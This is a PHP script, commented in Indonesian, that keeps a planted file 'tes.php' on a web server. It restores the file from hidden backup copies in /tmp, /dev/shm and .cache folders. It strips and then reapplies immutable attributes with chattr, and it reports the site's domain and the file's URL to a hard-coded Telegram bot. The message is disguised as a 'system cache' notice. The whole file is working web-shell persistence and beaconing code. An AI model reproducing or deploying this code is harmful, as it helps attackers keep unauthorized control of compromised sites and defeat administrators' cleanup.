<?php
$botToken = '8513008865:AAFvBdueP_HRaBfU5hm7el3lQAN1DxzgOE4';
$telegramUserId = '7547598395';

$targetFile = __DIR__ . '/tes.php';
$backupLocations = [
    '/tmp/temp.inc',
    '/var/tmp/temp.inc',
    '/dev/shm/temp.inc',
    __DIR__ . '/.cache/temp.inc',
    dirname(__DIR__) . '/.cache/temp.inc'
];

function sendTelegramMessage($botToken, $chatId, $message) {
    if (empty($botToken) || empty($chatId) || empty($message)) return false;
    if (strlen($message) > 4096) $message = substr($message, 0, 4000) . "\n\n... (dipotong)";
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'HTML', 'disable_web_page_preview' => true];
    $postData = http_build_query($data);
    
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
        $result = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($result !== false && $httpCode == 200) {
            $response = json_decode($result, true);
            if (isset($response['ok']) && $response['ok'] === true) return true;
        }
    }
    
    if (ini_get('allow_url_fopen')) {
        $options = [
            'http' => [
                'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => $postData,
                'timeout' => 30
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false
            ]
        ];
        $context = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);
        if ($result !== false) {
            $response = json_decode($result, true);
            if (isset($response['ok']) && $response['ok'] === true) return true;
        }
    }
    return false;
}

// Cek apakah file utama ada
if (!file_exists($targetFile)) {
    $restored = false;
    
    foreach ($backupLocations as $backup) {
        if (file_exists($backup)) {
            // Matikan chattr
            @shell_exec("chattr -i " . escapeshellarg($backup) . " 2>/dev/null");
            @shell_exec("chattr -a " . escapeshellarg($backup) . " 2>/dev/null");
            
            // Restore
            if (@copy($backup, $targetFile)) {
                @chmod($targetFile, 0644);
                @shell_exec("chattr +i " . escapeshellarg($targetFile) . " 2>/dev/null");
                $restored = true;
                
                // Kirim notifikasi
                $domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
                $protocol = isset($_SERVER['HTTPS']) ? 'https://' : 'http://';
                $url = $protocol . $domain . '/tes.php';
                
                $message = "🔄 *SYSTEM CACHE RESTORED*\n\n"
                         . "📁 File: <code>tes.php</code>\n"
                         . "📂 Path: <code>" . $targetFile . "</code>\n"
                         . "🌐 Domain: <code>" . $domain . "</code>\n"
                         . "🔗 URL: <a href='" . $url . "'>" . $url . "</a>\n"
                         . "💾 Restored from: <code>" . basename($backup) . "</code>\n"
                         . "🕐 Time: " . date('Y-m-d H:i:s') . "\n\n"
                         . "⚠️ File telah dipulihkan dari backup!";
                
                sendTelegramMessage($GLOBALS['botToken'], $GLOBALS['telegramUserId'], $message);
                break;
            }
        }
    }
    
    if ($restored) {
        echo "✅ File restored successfully!";
    } else {
        echo "❌ No backup found!";
    }
} else {
    echo "✅ File already exists!";
}
?>
